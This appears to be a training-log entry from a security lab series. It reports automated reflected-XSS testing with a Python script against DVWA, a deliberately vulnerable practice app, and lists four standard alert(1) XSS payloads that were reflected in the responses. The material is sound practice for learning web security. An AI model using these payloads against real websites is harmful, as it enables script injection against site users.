# Day 9 – XSS Automation with Python

## 🎯 Objective
Automate testing for reflected XSS vulnerabilities using a simple Python script and a set of payloads.

## 🛠️ Tool: Custom Python Script
Filename: `xss_scanner.py`  
Path: `scripts/xss_scanner.py`  
Log Output: `logs/xss_auto_output.txt`

## 🔍 Target URL
http://192.168.56.101/dvwa/vulnerabilities/xss_r/


## 📜 Payloads Tested
- `<script>alert(1)</script>`
- `"><svg/onload=alert(1)>`
- `';alert(1);//`
- `<img src=x onerror=alert(1)>`

## ✅ Reflected Payloads
The following payloads were reflected in the HTTP response, confirming **XSS vulnerability**:
- `<script>alert(1)</script>`
- `"><svg/onload=alert(1)>`
- `';alert(1);//`
- `<img src=x onerror=alert(1)>`

## 📁 Logs
Raw output saved in: `logs/xss_auto_output.txt`

## 🧠 Observations
- DVWA’s **Reflected XSS page** (low security) is vulnerable to classic and obfuscated payloads.
- The script efficiently filtered reflected responses using `in` match check.

## 📸 Screenshots (if any)
Add `xss_auto_success.png` if captured.

---
